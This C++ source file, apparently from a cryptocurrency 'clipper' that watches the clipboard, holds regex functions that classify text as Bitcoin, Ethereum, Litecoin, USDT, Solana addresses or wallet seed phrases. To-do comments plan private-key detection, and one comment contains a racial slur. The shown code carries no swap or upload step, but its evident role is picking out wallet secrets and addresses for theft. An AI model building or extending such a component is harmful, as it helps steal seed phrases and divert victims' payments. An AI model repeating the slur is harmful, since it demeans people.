#include "clip.h"
#include <iostream>
#include <regex>

// to do -> add priv key regex too.

bool bIsBtcAddy(std::string str) //nigger
{
    const std::regex pattern_btc(
       "^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,34}$");

    const std::regex pattern_bech32_btc(// new goofy wallets
        "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"); //{24,39}$
    if (str.empty()) {
        return false;
    }
    if (std::regex_match(str, pattern_btc)) {
        return true;
    }
    if (std::regex_match(str, pattern_bech32_btc)) {
        return true;
    }
    else {
        return false;
    }
}

bool bIsEthAddy(const std::string& address)
{
    std::regex regexPattern("^(0x)?[0-9a-fA-F]{40}$"); //^0x[a-fA-F0-9]{40}$
    return std::regex_match(address, regexPattern);
}

bool bIsLtcAddy(const std::string& address)
{
    std::regex regexPattern("^([LM3][a-km-zA-HJ-NP-Z1-9]{26,33}|ltc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{39,59})$");
    return std::regex_match(address, regexPattern);
}

bool bIsUsdtAddy(const std::string& address)
{
    std::regex regexPattern("^T[A-Za-z1-9]{33}$");
    return std::regex_match(address, regexPattern);
}

bool bIsBip32(const std::string& phrase) {
    std::regex regexPattern("^(\\b(?:[a-zA-Z]{3,}\\s){11,}\\b[a-zA-Z]{3,})$");
    return std::regex_match(phrase, regexPattern);
}

// new - solana
bool bIsSolanaAddy(const std::string& address) {
    std::regex regexPattern("^[A-HJ-NP-Za-km-z1-9]{44}$");
    return std::regex_match(address, regexPattern);
}


// return codes ud
// 0 = not a valid wallet addy
// 1 = btc
// 2 = eth
// 3 = ltc
// 4 = usdt
// 5 = bip32 seedphrase

// 6 = solana ----->   NEW!


int __check_format(std::string& xxxx)
{
	// check if sText is a crypto addy, if it is what currency (btc, ltc, eth)
    if (bIsBtcAddy(xxxx)) { return 1; }
    if (bIsEthAddy(xxxx)) { return 2; }
    if (bIsLtcAddy(xxxx)) { return 3; }
    if (bIsUsdtAddy(xxxx)) { return 4; }

    if (bIsSolanaAddy(xxxx)) { return 6; } // new! (solana)

    // now ima check to see if its a priv key or a seed phrase 
    if (bIsBip32(xxxx)) { return 5; }

    // to do -> add private key

    else { return 0; } // 0 is gonna mean none of conditions match aka its not a wallet addy/priv key/seedphrase
}